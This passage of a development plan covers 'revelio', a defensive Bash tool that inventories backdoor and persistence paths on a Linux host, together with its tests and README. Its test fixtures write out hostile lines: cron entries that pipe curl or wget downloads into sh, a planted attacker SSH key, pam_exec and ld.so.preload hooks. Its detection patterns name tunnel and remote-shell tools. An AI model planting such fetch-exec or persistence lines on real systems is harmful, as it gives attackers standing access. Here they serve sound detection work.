# best-effort: resolve a process name to its binary path (live system only)
_resolve_bin() { command -v "$1" 2>/dev/null || true; }

check_listening() {
  if [ -n "$REVELIO_ROOT" ]; then
    blindspot "listening sockets (live-only; not available when auditing REVELIO_ROOT=$REVELIO_ROOT)"
    return 0
  fi
  local line addr proc pname bin
  # -H omits header; -p needs root for full process info -> note blind spot if empty
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    addr="$(awk '{print $4}' <<<"$line")"
    proc="$(grep -oE 'users:\(\("[^"]+"' <<<"$line" | sed -E 's/.*\("//')"
    pname="${proc:-unknown}"
    if [ -z "$proc" ]; then
      blindspot "process names for listening sockets (need root for ss -p)"
    fi
    bin="$(_resolve_bin "$pname")"
    if [ -n "$bin" ]; then
      classify_provenance "$bin" listen "Listening: $addr ($pname)" \
        "binary: $bin" "stop/remove the service if you don't recognise it"
    else
      emit attention listen "Listening: $addr ($pname)" \
        "binary: unresolved" "identify the process: ss -tlnp | grep '$addr'"
    fi
  done < <(revelio_ss -tlnpH; revelio_ss -ulnpH)
}
```

- [ ] **Step 4: Wire in** — add `check_listening` to `run_all_checks`.

- [ ] **Step 5: Run tests**

Run: `bats test/unit/check_listening.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_listening.bats
git commit -q -m "feat: check_listening — listening sockets classified by package provenance"
```

---

## Task 8: check_tunnels — autossh, reverse tunnels, remote-access daemons

**Files:**
- Modify: `revelio` (add `check_tunnels`; call it)
- Test: `test/unit/check_tunnels.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/check_tunnels.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; }

ps_fixture() {
cat <<'EOF'
  800 /usr/sbin/sshd -D
 1500 autossh -M 0 -R 2222:localhost:22 relay@example.com
 1600 ssh -R 9000:localhost:80 user@1.2.3.4
 1700 /usr/bin/cloudflared tunnel run
EOF
}

@test "flags autossh, reverse-tunnel ssh -R, and cloudflared" {
  revelio_ps() { ps_fixture; }
  check_tunnels
  emitted attention "autossh"
  emitted attention "reverse tunnel"
  emitted attention "cloudflared"
}

@test "plain sshd -D is not flagged as a tunnel" {
  revelio_ps() { echo '  800 /usr/sbin/sshd -D'; }
  check_tunnels
  [ "$_N_ATTENTION" -eq 0 ]
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_tunnels.bats`
Expected: FAIL.

- [ ] **Step 3: Implement `check_tunnels`**

```bash
check_tunnels() {
  if [ -n "$REVELIO_ROOT" ]; then
    blindspot "outbound tunnels (live-only; not available when auditing REVELIO_ROOT)"
    return 0
  fi
  local line cmd
  while IFS= read -r line; do
    cmd="${line#"${line%%[![:space:]]*}"}"   # ltrim
    cmd="${cmd#* }"                            # drop pid column
    case "$cmd" in
      autossh*) emit attention tunnel "autossh persistent tunnel" "cmd: $cmd" "kill the autossh process / remove its unit if unexpected" ;;
      *ssh*-R*) emit attention tunnel "ssh reverse tunnel (-R)" "cmd: $cmd" "kill the ssh -R process if unexpected" ;;
      *cloudflared*tunnel*) emit attention tunnel "cloudflared tunnel running" "cmd: $cmd" "this exposes the box outward; remove if you didn't set it up" ;;
      *ngrok*|*frpc*|*frps*|*tailscaled*|*zerotier*) emit attention tunnel "remote-access daemon: ${cmd%% *}" "cmd: $cmd" "remove the daemon if you didn't set it up" ;;
    esac
  done < <(revelio_ps -eo pid=,args= 2>/dev/null)
}
```

- [ ] **Step 4: Wire in** — add `check_tunnels` to `run_all_checks`.

- [ ] **Step 5: Run tests**

Run: `bats test/unit/check_tunnels.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_tunnels.bats
git commit -q -m "feat: check_tunnels — autossh, ssh -R, cloudflared/ngrok/frp/tailscale/zerotier"
```

---

## Task 9: check_scheduled — cron, cron.d, systemd timers; flag fetch-exec

**Files:**
- Modify: `revelio` (add `check_scheduled`; call it)
- Test: `test/unit/check_scheduled.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/check_scheduled.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; }

@test "hand-dropped cron.d entry is attention; loud when it fetch-execs" {
  _PM=rpm
  pkg_owns() { return 1; }   # not package-owned
  echo '* * * * * root curl http://5.9.1.2/x | sh' > "$ROOT/etc/cron.d/evil"
  check_scheduled
  emitted attention "evil"
  emitted attention "fetch-exec"
}

@test "package-owned cron file is normal" {
  _PM=rpm
  pkg_owns() { return 0; }   # owned
  echo '0 3 * * * root /usr/bin/logrotate' > "$ROOT/etc/cron.d/logrotate"
  check_scheduled
  emitted normal "logrotate"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_scheduled.bats`
Expected: FAIL.

- [ ] **Step 3: Implement `check_scheduled`**

```bash
_is_fetch_exec() { # 0 if text pipes a download into a shell (or decodes into one)
  printf '%s' "$1" | grep -qE "$FETCHEXEC_RE"
}

check_scheduled() {
  local f content
  # /etc/cron.d + /etc/cron.{hourly,daily,weekly,monthly} + /etc/crontab
  for f in "$REVELIO_ROOT"/etc/cron.d/* \
           "$REVELIO_ROOT"/etc/cron.hourly/* "$REVELIO_ROOT"/etc/cron.daily/* \
           "$REVELIO_ROOT"/etc/cron.weekly/* "$REVELIO_ROOT"/etc/cron.monthly/* \
           "$REVELIO_ROOT/etc/crontab"; do
    [ -f "$f" ] || continue
    content="$(grep -vE '^\s*(#|$)' "$f" 2>/dev/null | head -20)"
    local rem="remove ${f#"$REVELIO_ROOT"} if you didn't create it"
    local detail="file: ${f#"$REVELIO_ROOT"}"$'\n'"$content"
    if _is_fetch_exec "$content"; then
      emit attention sched "Cron job that fetch-execs: ${f##*/}" "$detail" "$rem"
    else
      classify_provenance "$f" sched "Cron job: ${f##*/}" "$detail" "$rem"
    fi
  done

  # per-user crontabs (need root for others)
  local spool="$REVELIO_ROOT/var/spool/cron"
  if [ -d "$spool" ]; then
    for f in "$spool"/* "$spool"/crontabs/*; do
      [ -f "$f" ] || continue
      content="$(grep -vE '^\s*(#|$)' "$f" 2>/dev/null | head -20)"
      emit attention sched "User crontab: ${f##*/}" "file: ${f#"$REVELIO_ROOT"}"$'\n'"$content" \
        "crontab -u ${f##*/} -e   # review"
    done
  fi

  # systemd timers (live-only)
  if [ -z "$REVELIO_ROOT" ] && command -v systemctl >/dev/null 2>&1; then
    local unit
    while read -r unit _; do
      case "$unit" in *.timer)
        local svc="${unit%.timer}.service"
        local path; path="$(systemctl show -p FragmentPath --value "$unit" 2>/dev/null)"
        if [ -n "$path" ]; then
          classify_provenance "$path" sched "systemd timer: $unit" "unit file: $path" "systemctl disable --now $unit   # if unexpected"
        fi
      ;; esac
    done < <(systemctl list-timers --all --no-legend 2>/dev/null | awk '{print $NF}')
  fi
}
```

- [ ] **Step 4: Wire in** — add `check_scheduled` to `run_all_checks`.

- [ ] **Step 5: Run tests**

Run: `bats test/unit/check_scheduled.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_scheduled.bats
git commit -q -m "feat: check_scheduled — cron/cron.d/timers by provenance; loud on fetch-exec"
```

---

## Task 10: check_persistence — PAM, rc.local, profile.d, shell rc, ld.so.preload

**Files:**
- Modify: `revelio` (add `check_persistence`; call it)
- Test: `test/unit/check_persistence.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/check_persistence.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; _PM=none; }

@test "flags pam_exec in a pam.d file" {
  echo 'auth optional pam_exec.so /opt/x.sh' > "$ROOT/etc/pam.d/sshd"
  check_persistence
  emitted attention "pam_exec"
}

@test "flags ld.so.preload presence" {
  echo '/opt/evil.so' > "$ROOT/etc/ld.so.preload"
  check_persistence
  emitted attention "ld.so.preload"
}

@test "flags a curl|sh line in a shell rc file" {
  mkdir -p "$ROOT/home/alice"
  echo 'curl http://x/y | sh' > "$ROOT/home/alice/.bashrc"
  check_persistence
  emitted attention ".bashrc"
}

@test "flags an executable script dropped in profile.d" {
  echo 'wget -qO- http://x | bash' > "$ROOT/etc/profile.d/zz.sh"
  check_persistence
  emitted attention "profile.d"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_persistence.bats`
Expected: FAIL.

- [ ] **Step 3: Implement `check_persistence`**

```bash
check_persistence() {
  local f line home

  # 1) PAM modules that run code on every auth
  for f in "$REVELIO_ROOT"/etc/pam.d/*; do
    [ -f "$f" ] || continue
    if grep -qE 'pam_exec\.so|pam_python|pam_script' "$f" 2>/dev/null; then
      emit attention persist "PAM runs external code: ${f##*/}" \
        "$(grep -E 'pam_exec\.so|pam_python|pam_script' "$f")" \
        "review ${f#"$REVELIO_ROOT"} — pam_exec runs on every auth"
    fi
  done

  # 2) ld.so.preload (LD_PRELOAD persistence / rootkit hook)
  f="$REVELIO_ROOT/etc/ld.so.preload"
  if [ -s "$f" ]; then
    emit attention persist "/etc/ld.so.preload is non-empty" \
      "preloads into EVERY process:"$'\n'"$(cat "$f")" \
      "inspect each .so; empty the file if you didn't set it up"
  fi

  # 3) rc.local
  f="$REVELIO_ROOT/etc/rc.local"
  if [ -s "$f" ] && grep -qvE '^\s*(#|exit|$)' "$f" 2>/dev/null; then
    emit attention persist "/etc/rc.local has boot commands" "$(grep -vE '^\s*(#|$)' "$f" | head)" \
      "review /etc/rc.local"
  fi

  # 4) profile.d + shell rc files: look for fetch-exec / reverse shells
  local targets=()
  for f in "$REVELIO_ROOT"/etc/profile.d/*; do [ -f "$f" ] && targets+=("$f"); done
  while IFS= read -r home; do
    for f in "$home/.bashrc" "$home/.bash_profile" "$home/.profile" "$home/.zshrc"; do
      [ -f "$f" ] && targets+=("$f")
    done
  done < <(_home_dirs)

  for f in "${targets[@]:-}"; do
    [ -f "$f" ] || continue
    if grep -qE "$FETCHEXEC_RE|$REVSHELL_RE" "$f" 2>/dev/null; then
      emit attention persist "Suspicious line in ${f#"$REVELIO_ROOT"}" \
        "$(grep -nE "$FETCHEXEC_RE|$REVSHELL_RE" "$f" | head)" \
        "edit ${f#"$REVELIO_ROOT"} and remove the line if you don't recognise it"
    fi
  done
}
```

- [ ] **Step 4: Wire in** — add `check_persistence` to `run_all_checks`.

- [ ] **Step 5: Run tests**

Run: `bats test/unit/check_persistence.bats`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_persistence.bats
git commit -q -m "feat: check_persistence — PAM/ld.so.preload/rc.local/profile.d/shell-rc"
```

---

## Task 11: check_escalation — non-package setuid binaries + capabilities

**Files:**
- Modify: `revelio` (add `check_escalation`; call it)
- Test: `test/unit/check_escalation.bats`

- [ ] **Step 1: Write the failing tests**

`test/unit/check_escalation.bats`:
```bash
#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; }

@test "setuid binary NOT owned by a package is attention; owned is normal" {
  _PM=rpm
  mkdir -p "$ROOT/usr/bin" "$ROOT/opt"
  install -m 4755 /bin/true "$ROOT/usr/bin/sudo"      # pretend distro setuid
  install -m 4755 /bin/true "$ROOT/opt/rootme"        # hand-dropped setuid
  pkg_owns() { case "$1" in */usr/bin/sudo) return 0;; *) return 1;; esac; }
  check_escalation
  emitted attention "rootme"
  emitted normal "/usr/bin/sudo"
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `bats test/unit/check_escalation.bats`
Expected: FAIL.

- [ ] **Step 3: Implement `check_escalation`**

```bash
check_escalation() {
  local scan_root="${REVELIO_ROOT:-/}" f
  # default: common dirs; --thorough: whole tree
  local dirs
  if [ "$THOROUGH" -eq 1 ]; then
    dirs=("$scan_root")
  else
    dirs=("$scan_root/usr" "$scan_root/bin" "$scan_root/sbin" "$scan_root/opt" "$scan_root/home" "$scan_root/root" "$scan_root/tmp" "$scan_root/var/tmp")
  fi

  # setuid/setgid binaries
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    classify_provenance "$f" escalate "setuid/setgid binary: ${f#"$scan_root"}" \
      "perms: $(stat -c '%A' "$f" 2>/dev/null)" \
      "if hand-placed and unexpected: chmod u-s,g-s '${f#"$scan_root"}' or remove it"
  done < <(find "${dirs[@]}" -xdev -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null)

  # file capabilities (live-only; getcap needs the real fs)
  if [ -z "$REVELIO_ROOT" ] && command -v getcap >/dev/null 2>&1; then
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      local capf="${line%% *}"
      classify_provenance "$capf" escalate "file capability: $line" \
        "capabilities grant elevated powers without setuid" \
        "setcap -r '$capf'   # if unexpected"
    done < <(revelio_getcap -r "${dirs[@]}" 2>/dev/null)
  fi
}
```

- [ ] **Step 4: Wire in** — add `check_escalation` to `run_all_checks`. Final `run_all_checks`:

```bash
run_all_checks() {
  check_ssh
  check_accounts
  check_listening
  check_tunnels
  check_scheduled
  check_persistence
  check_escalation
}
```

- [ ] **Step 5: Run all unit tests**

Run: `bats test/unit/`
Expected: PASS (all files).

- [ ] **Step 6: Commit**

```bash
git add revelio test/unit/check_escalation.bats
git commit -q -m "feat: check_escalation — non-package setuid/setgid + file capabilities; wire all checks"
```

---

## Task 12: Integration tests — real Fedora + Debian via podman

**Files:**
- Create: `test/integration/Dockerfile.fedora`, `test/integration/Dockerfile.debian`, `test/integration/end_to_end.bats`

Validates what unit mocks cannot: real `pkg_owns` against real rpm/dpkg databases.

- [ ] **Step 1: Write the Fedora fixture image**

`test/integration/Dockerfile.fedora`:
```dockerfile
FROM fedora:40
# plant a hand-dropped backdoor cron (not owned by any rpm) + a rogue authorized_key
RUN mkdir -p /root/.ssh \
 && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1 evil@attacker' > /root/.ssh/authorized_keys \
 && echo '* * * * * root curl http://198.51.100.7/x | sh' > /etc/cron.d/zz-backdoor
COPY revelio /usr/local/bin/revelio
RUN chmod +x /usr/local/bin/revelio
ENTRYPOINT ["/usr/local/bin/revelio", "--no-color"]
```

- [ ] **Step 2: Write the Debian fixture image**

`test/integration/Dockerfile.debian`:
```dockerfile
FROM debian:12
RUN mkdir -p /root/.ssh \
 && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1 evil@attacker' > /root/.ssh/authorized_keys \
 && echo '* * * * * root wget -qO- http://198.51.100.7/x | sh' > /etc/cron.d/zz-backdoor
COPY revelio /usr/local/bin/revelio
RUN chmod +x /usr/local/bin/revelio
ENTRYPOINT ["/usr/local/bin/revelio", "--no-color"]
```

- [ ] **Step 3: Write the end-to-end test**

`test/integration/end_to_end.bats`:
```bash
#!/usr/bin/env bats
load ../helpers

build_and_run() { # distro -> sets $output / $status
  local distro="$1"
  podman build -q -f "$REPO_ROOT/test/integration/Dockerfile.$distro" \
    -t "revelio-it-$distro" "$REPO_ROOT" >/dev/null
  run podman run --rm "revelio-it-$distro"
}

@test "fedora: surfaces rogue key + fetch-exec cron, exit 10" {
  command -v podman >/dev/null || skip "podman not installed"
  build_and_run fedora
  [ "$status" -eq 10 ]
  [[ "$output" == *"evil@attacker"* ]]
  [[ "$output" == *"fetch-exec"* ]]
  [[ "$output" == *"zz-backdoor"* ]]
}

@test "debian: surfaces rogue key + fetch-exec cron, exit 10" {
  command -v podman >/dev/null || skip "podman not installed"
  build_and_run debian
  [ "$status" -eq 10 ]
  [[ "$output" == *"evil@attacker"* ]]
  [[ "$output" == *"fetch-exec"* ]]
}

@test "fedora: a real rpm-owned cron file lands in distro-normal (-v)" {
  command -v podman >/dev/null || skip "podman not installed"
  podman build -q -f "$REPO_ROOT/test/integration/Dockerfile.fedora" -t revelio-it-fedora "$REPO_ROOT" >/dev/null
  # crontabs package owns /etc/crontab on Fedora; run with -v and assert it's normal-tiered
  run podman run --rm --entrypoint /usr/local/bin/revelio revelio-it-fedora -v --no-color
  [[ "$output" == *"distro-normal"* ]]
}
```

- [ ] **Step 4: Run integration tests**

Run: `bats test/integration/end_to_end.bats`
Expected: PASS (or SKIP if podman absent).

- [ ] **Step 5: Commit**

```bash
git add test/integration/
git commit -q -m "test: podman integration — real rpm/dpkg provenance on Fedora + Debian"
```

---

## Task 13: README, release script, self-audit demo

**Files:**
- Create: `README.md`, `release.sh`

- [ ] **Step 1: Write `README.md`**

````markdown
# Homenum Revelio

`revelio` reveals who else still has a way into a Linux host you were just handed —
a bought/inherited VPS, a contractor's leftover box, a server someone set up for you.
It prints a **complete inventory** of every standing-access path and tells you which
entries are package-owned (distro-normal) versus placed by a human. It never says
"SAFE" — it hands you the facts and you decide which you recognise.

## Don't trust me. Read me.

This is a tool for checking that nobody left a backdoor — so it would be absurd to
ask you to blindly trust it. It's one readable Bash file:

```sh
curl -O https://raw.githubusercontent.com/agents-deployed/homenum-revelio/<commit>/revelio
less revelio          # read it — it's ~600 lines
sh revelio            # then run it
```

- **No network.** `grep -nE 'curl|wget|/dev/tcp|/dev/udp|nc |ncat|telnet' revelio` → nothing.
- **No writes.** Output goes to your terminal; `--save FILE` is the only write, and it's yours.
- **No root required.** It runs as you and tells you exactly what it couldn't see without root.

## Usage

```
revelio [-v] [--no-color] [--save FILE] [--thorough]
```

Exit code is an **attention count, not a verdict**: `0` nothing needs your eyes,
`10` items need your eyes, `1` tool error.

`REVELIO_ROOT=/mnt revelio` audits a mounted disk image instead of the live system.

## What it checks

SSH keys & sshd danger knobs · extra/abnormal accounts, empty passwords, sudoers,
docker group · listening services · outbound tunnels (autossh, `ssh -R`,
cloudflared/ngrok/frp/tailscale/zerotier) · scheduled execution (cron, cron.d,
systemd timers; loud on `curl|sh`) · login/boot persistence (PAM, `ld.so.preload`,
rc.local, profile.d, shell rc) · non-package setuid binaries & capabilities.

## What it deliberately does NOT do

No hardening/posture scoring · no antivirus/signature scanning · no rootkit or
kernel-integrity claims (a userspace script can't prove those honestly). It makes
one narrow, provable claim: *here is every way in we could read.*

## Who made it

Built by the [agents-deployed](https://agents-deployed.com) team. We run it on every
box we hand over. It has **no special knowledge of our boxes** — read the source and
confirm it treats every host the same.

MIT licensed.
````

- [ ] **Step 2: Write `release.sh`**

```bash
#!/usr/bin/env bash
# Generate SHA256SUMS for a release. Maintainer-only; not part of the tool.
set -eu
cd "$(dirname "$0")"
sha256sum revelio > SHA256SUMS
echo "wrote SHA256SUMS:"
cat SHA256SUMS
```

- [ ] **Step 3: Self-audit demo — run revelio on the dev box**

Run: `./revelio -v | head -40`
Expected: a rendered inventory; the dev box's real keys/services appear under the right tiers. Sanity-check that nothing crashes and the output reads cleanly. (Read-only; safe to run.)

- [ ] **Step 4: Verify the no-network invariant on the finished script**

Run: `grep -nE 'curl|wget|/dev/tcp|/dev/udp|nc |ncat|telnet' revelio | grep -vE ':\s*#'`
Expected: no output (only the comment references, which are filtered out).

- [ ] **Step 5: Commit**

```bash
chmod +x release.sh
git add README.md release.sh
git commit -q -m "docs: README trust pitch + usage; add release.sh (SHA256SUMS)"
```

---

## Task 14: Full suite green + shellcheck

**Files:** none (verification + cleanup)

- [ ] **Step 1: Run the entire suite**

Run: `bats test/unit/ test/integration/`
Expected: all PASS (integration may SKIP without podman).

- [ ] **Step 2: shellcheck the tool**

Run: `shellcheck -s bash revelio || echo 'INSTALL: sudo dnf install -y ShellCheck'`
Expected: no errors. Fix any warnings that affect correctness; annotate intentional ones with `# shellcheck disable=...` + a reason.

- [ ] **Step 3: Confirm clean working tree + final commit if shellcheck changed anything**

```bash
git status --porcelain
# if changes:
git add revelio && git commit -q -m "style: shellcheck clean"
```

---

## Self-Review (completed during planning)

**Spec coverage:**
- Scope = handover trust audit → Tasks 5–11 (the 7 buckets). ✓
- Disclose-don't-judge / no SAFE verdict → Task 3 render (two tiers, attention count exit code). ✓
- Provenance engine (package ownership) + degradation → Task 4. ✓
- Trustworthy-by-construction (zero network, read-only, root-optional, read-before-run) → Tasks 2 (invariants), 3 (`--save` only write), blind-spots across checks, Task 13 README. ✓
- Single sourceable file → Task 1 source-guard; helper `src()` exercises it. ✓
- 7-bucket catalog with forensic context + remediation → Tasks 5–11 (each `emit` carries detail + remediation). ✓
- Output/UX: default/-v, colour/NO_COLOR/--no-color, --save, blind spots, exit codes → Task 3. ✓
- REVELIO_ROOT (mounted-image audit + test seam) → Task 1 globals, used throughout. ✓
- Testing via container fixtures (Fedora+dpkg) + positive/negative + degradation → Tasks 5–12 (unit pos/neg; integration real PMs; degradation unit-tested in Task 4). ✓
- Non-goals (no posture/AV/rootkit/network) → enforced by Task 2 invariant + scope of checks + README. ✓
- Reuse-by-support (one-way) → enabled by the source-guard (Task 1); support integration is out of this plan's scope (separate project). ✓

**Placeholder scan:** no TBD/TODO; every code step shows complete code; every test shows assertions. The `run_all_checks` body is intentionally grown task-by-task (each task states the exact new line + the final full body in Task 11).

**Type/name consistency:** `emit TIER CAT TITLE DETAIL [REM]`, `classify_provenance PATH CAT TITLE DETAIL [REM]`, `pkg_owns`→0/1/2, wrappers `revelio_ss/getcap/ps`, globals `_ITEMS/_N_ATTENTION/_N_NORMAL/_BLINDSPOTS/_PM`, `REVELIO_ROOT`, `_home_dirs`, `_resolve_bin` — used identically across all tasks. Checks all named `check_<bucket>` and all routed through `emit`/`classify_provenance`.

**Known limitation documented:** `pkg_owns` queries the live package DB; under `REVELIO_ROOT=/mnt` (mounted image) provenance for that image isn't resolved in v1 (the affected live-only checks emit a blind spot instead). Acceptable for v1; noted here so it isn't mistaken for a bug.
